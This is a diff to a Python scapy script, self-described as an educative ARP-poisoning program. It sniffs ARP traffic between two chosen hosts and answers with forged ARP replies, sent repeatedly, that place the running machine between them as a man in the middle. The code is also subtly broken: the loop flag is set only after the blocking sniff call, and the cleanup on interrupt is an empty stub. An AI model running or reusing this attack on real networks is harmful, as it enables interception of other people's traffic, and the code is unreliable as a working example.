@@ -1,6 +1,8 @@
 import argparse
 import ipaddress
 import re
+import time
+
 from scapy.all import sniff, ARP, sr, Ether, send, sendp, conf
 
 def check_ipv4(ip:str) -> bool:
@@ -42,31 +44,35 @@ def handle(pkt):
 
     if check_arp(arp, src, target):
         print(f"poison attack !!! src is {arp.psrc} and target is {arp.pdst}")
-        while(1):
-            pkt = Ether(dst=arp.hwsrc) / ARP(
-                op=2,
-                hwsrc=None, #scapy autofill
-                psrc=arp.pdst,
-                pdst=arp.psrc,
-                hwdst=arp.hwsrc
-            )
-            pkt.show2()
-            sendp(pkt, count=5, verbose=False)
+        pkt = Ether(dst=arp.hwsrc) / ARP(
+            op=2,
+            hwsrc=None,  # scapy autofill
+            psrc=arp.pdst,
+            pdst=arp.psrc,
+            hwdst=arp.hwsrc
+        )
+        pkt.show2()
+        if arp.psrc == src[0]:
+            mac_send = target[1]
+        else:
+            mac_send = src[1]
 
-            if arp.psrc == src[0]:
-                mac_send = target[1]
+        pkt2 = Ether(dst=arp.hwsrc) / ARP(
+            op=2,
+            hwsrc=None,  # scapy autofill
+            psrc=arp.psrc,
+            pdst=arp.pdst,
+            hwdst=mac_send
+        )
+        pkt2.show()
+        while(is_running):
+            try:
+                sendp(pkt, count=5, verbose=False)
+                sendp(pkt2, count=5, verbose=False)
+            except KeyboardInterrupt:
+                pass #restore
             else:
-                mac_send = src[1]
-
-            pkt2 = Ether(dst=arp.hwsrc) / ARP(
-                op=2,
-                hwsrc=None, #scapy autofill
-                psrc=arp.psrc,
-                pdst=arp.pdst,
-                hwdst=mac_send
-            )
-            pkt2.show()
-            sendp(pkt2, count=5, verbose=False)
+                time.sleep(2)
 
 #--------------------argparse--------------------
 parser = argparse.ArgumentParser(description="educative program about ARP poisoning")
@@ -84,3 +90,5 @@ if not check_ipv4(src[0]) or not check_ipv4(target[0]) or not check_mac(src[1]) 
     exit(1)
 
 sniff(filter="arp", prn=handle, store=False)
+
+is_running = True
